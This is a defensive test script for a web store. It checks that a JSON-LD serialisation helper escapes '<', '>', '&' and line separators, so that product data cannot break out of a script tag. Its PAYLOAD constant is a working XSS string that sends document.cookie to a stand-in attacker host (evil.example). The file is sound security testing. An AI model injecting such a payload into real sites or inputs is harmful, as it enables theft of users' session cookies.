/*
 * Proves lib/json-ld.ts neutralises a script-tag breakout.
 *
 *   node apps/store/scripts/json-ld-test.mjs
 *
 * The payload is the real attack: a product name that closes our <script>
 * and opens the attacker's. JSON.stringify alone does not touch "<", so the
 * browser sees a second, executable script tag.
 */
import { jsonLd } from "../src/lib/json-ld.ts";

const PAYLOAD = `Moon chain</script><script>fetch('https://evil.example/'+document.cookie)</script>`;
const doc = { "@type": "Product", name: PAYLOAD, description: "a & b", sku: "WC-005" };

let fail = 0;
const ck = (n, ok, x = "") => { if (!ok) fail++; console.log(`${ok ? "PASS" : "FAIL"}  ${n}${x ? "  " + x : ""}`); };

const unsafe = JSON.stringify(doc);
const safe = jsonLd(doc);

ck("the naive version IS vulnerable (baseline)", unsafe.includes("</script>"));
ck("jsonLd emits no literal '</script>'", !safe.includes("</script>"));
ck("jsonLd emits no raw '<'", !safe.includes("<"));
ck("jsonLd emits no raw '>'", !safe.includes(">"));
ck("jsonLd emits no raw '&'", !safe.includes("&"));

/* Still valid JSON, and still the same data once parsed — the escapes live
   inside JSON string literals, so a crawler sees the original text. */
let parsed = null;
try { parsed = JSON.parse(safe); } catch {}
ck("output is still valid JSON", parsed !== null);
ck("round-trips to the identical value", parsed && parsed.name === PAYLOAD);
ck("ampersands survive semantically", parsed && parsed.description === "a & b");

/* And the line-terminator case, which is legal JSON but illegal JS source. */
const sep = jsonLd({ n: "a\u2028b\u2029c" });
ck("U+2028/U+2029 are escaped", !/[\u2028\u2029]/.test(sep));
ck("...and still round-trip", JSON.parse(sep).n === "a\u2028b\u2029c");

console.log(fail ? `\n${fail} FAILURE(S)` : "\nall pass");
process.exit(fail ? 1 : 0);
